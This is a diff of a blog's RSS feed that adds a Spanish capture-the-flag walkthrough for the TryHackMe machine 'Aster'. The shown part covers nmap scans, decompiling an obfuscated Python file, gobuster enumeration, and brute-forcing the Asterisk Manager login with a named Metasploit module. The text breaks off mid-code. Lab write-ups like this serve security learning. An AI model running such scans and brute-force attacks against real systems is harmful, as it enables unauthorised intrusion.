@@ -12,7 +12,7 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>es</language>
     <copyright>©{year}, All Rights Reserved</copyright>
-    <lastBuildDate>Sun, 21 Jun 2020 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Thu, 01 Oct 2020 00:00:00 +0000</lastBuildDate>
     <sy:updatePeriod>daily</sy:updatePeriod>
     <sy:updateFrequency>daily</sy:updateFrequency>
     
@@ -21,6 +21,676 @@
     
     
 
+      
+      <item>
+        <title>TryHackMe - Aster</title>
+        <link>https://sckull.github.io/posts/aster/</link>
+        <pubDate>Thu, 01 Oct 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Thu, 01 Oct 2020 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/aster/</guid>
+        <description>Aster es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
+        <content:encoded>&lt;p&gt;Aster es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/aster/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Titulo&lt;/th&gt;
+&lt;th&gt;Aster&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Info&lt;/td&gt;
+&lt;td&gt;Hack my server dedicated for building communications applications.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;110&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Media&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/stuxnet&#34;&gt;stuxnet&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
+&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80), h323q931(?) (1720), cisco-sccp (2000), asterisk (5038) y el puerto ssh (22) abiertos entre otros de los cuales no logramos obtener mucha informacion.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Sep 25 15:53:12 2020 as: nmap -p- --min-rate 1000 -o allPorts aster.thm&lt;/span&gt;
+Warning: 10.10.105.28 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; aster.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.105.28&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;65508&lt;/span&gt; closed ports
+PORT      STATE    SERVICE
+22/tcp    open     ssh
+80/tcp    open     http
+1720/tcp  open     h323q931
+2000/tcp  open     cisco-sccp
+5038/tcp  open     unknown
+8022/tcp  filtered oa-system
+8766/tcp  filtered amcs
+9765/tcp  filtered unknown
+12914/tcp filtered unknown
+12955/tcp filtered unknown
+13827/tcp filtered unknown
+23734/tcp filtered unknown
+24689/tcp filtered unknown
+31507/tcp filtered unknown
+32749/tcp filtered unknown
+35841/tcp filtered unknown
+36268/tcp filtered unknown
+37303/tcp filtered unknown
+39769/tcp filtered unknown
+43235/tcp filtered unknown
+45589/tcp filtered unknown
+46305/tcp filtered unknown
+48045/tcp filtered unknown
+56150/tcp filtered unknown
+60407/tcp filtered unknown
+63664/tcp filtered unknown
+63871/tcp filtered unknown
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Sep 25 15:55:14 2020 -- 1 IP address (1 host up) scanned in 122.08 seconds&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Sep 25 15:57:39 2020 as: nmap -p22,80,1720,2000,5038,8022,8766,9765,12914,12955,13827,23734,24689,31507,32749,35841,36268,37303,39769,43235,45589,46305,48045,56150,60407,63664,63871 -sV -sC -o servicesAllPorts aster.thm&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; aster.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.105.28&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.40s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+
+PORT      STATE  SERVICE     VERSION
+22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; fe:e3:52:06:50:93:2e:3f:7a:aa:fc:69:dd💿14:a2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 9c:4d:fd:a4:4e:18:ca:e2:c0:01:84:8c:d2:7a:51:f2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; c5:93:a6:0c:01:8a:68:63:d7:84:16:dc:2c:0a:96:1d &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+80/tcp    open   http        Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Aster CTF
+1720/tcp  open   h323q931?
+2000/tcp  open   cisco-sccp?
+5038/tcp  open   asterisk    Asterisk Call Manager 5.0.2
+8022/tcp  closed oa-system
+8766/tcp  closed amcs
+9765/tcp  closed unknown
+12914/tcp closed unknown
+12955/tcp closed unknown
+13827/tcp closed unknown
+23734/tcp closed unknown
+24689/tcp closed unknown
+31507/tcp closed unknown
+32749/tcp closed unknown
+35841/tcp closed unknown
+36268/tcp closed unknown
+37303/tcp closed unknown
+39769/tcp closed unknown
+43235/tcp closed unknown
+45589/tcp closed unknown
+46305/tcp closed unknown
+48045/tcp closed unknown
+56150/tcp closed unknown
+60407/tcp closed unknown
+63664/tcp closed unknown
+63871/tcp closed unknown
+Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Sep 25 15:58:42 2020 -- 1 IP address (1 host up) scanned in 62.78 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
+&lt;p&gt;Encontramos una pagina web en el puerto 80 en la que nos da un script en python.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/aster/Screenshot_20200925_154029.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/aster$ file output.pyc 
+output.pyc: python 2.7 byte-compiled
+kali@kali:~/thm/aster$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Utilizamos &lt;code&gt;uncompyle6&lt;/code&gt; para extraer el codigo fuente el cual contenia algunos mensajes codificados en hex.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# uncompyle6 version 3.7.3&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Python bytecode 2.7 (62211)&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Decompiled from: Python 3.8.2 (default, Apr  1 2020, 15:52:55) &lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# [GCC 9.3.0]&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Embedded file name: ./output.py&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Compiled at: 2020-08-11 02:59:35&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pyfiglet&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;pyfiglet_var&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pyfiglet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;figlet_format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Hello!!&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;oO00oOo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;OOOo0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fromhex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;oO00oOo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;Oooo000o&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OOOo0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ASCII&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;i1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ii1IiI1i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OOooOOo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;I11i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;o0O&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IiiIII111iI&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;Oo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;I1Ii11I1Ii1i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fromhex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Oo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;Ooo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;I1Ii11I1Ii1i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ASCII&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;iii1I1I&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;O00oOoOoO0o0O&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;O0oo0OO0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Oo0ooO0oo0oO&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;I1i1iI1i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;II&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pyfiglet_var&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# okay decompiling output.pyc&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Vemos en uno de los mensajes el usuario &lt;code&gt;admin&lt;/code&gt; y que esta instalado algun software de comunicacion en el servidor.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e: Good job, user &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt; the open &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; framework &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; building communications, installed in the server.
+
+476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21: Good job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool!
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
+&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos pero no encontramos más que solo los archivos estaticos de la pagina.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/aster$ gobuster dir -u http://aster.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
+/assets &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;asterisk&#34;&gt;ASTERISK&lt;/h2&gt;
+&lt;p&gt;Entre los puertos que encontramos se encuentra &lt;code&gt;Asterisk Call Manager 5.0.2&lt;/code&gt; el cual permite que un usuario se conecte a este puerto y ejecute comandos o lea eventos. Al investigar sobre este &amp;ldquo;servicio/server&amp;rdquo; encontramos un post donde realizan un &lt;a href=&#34;https://www.hackingarticles.in/penetration-testing-on-voip-asterisk-server-part-2/&#34;&gt;&lt;strong&gt;&amp;lsquo;Pentesting&amp;rsquo;&lt;/strong&gt;&lt;/a&gt; a este servicio, primero utilizamos el modulo de metasploit &lt;code&gt;use auxiliary/voip/asterisk_login&lt;/code&gt; el cual realiza un ataque de fuerza bruta, conociendo un nombre de usuario (admin) y utilizando los wordlist que vienen por defecto ejecutamos el modulo. Logrando encontrar la &amp;ldquo;contraseña&amp;rdquo; de este usuario.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
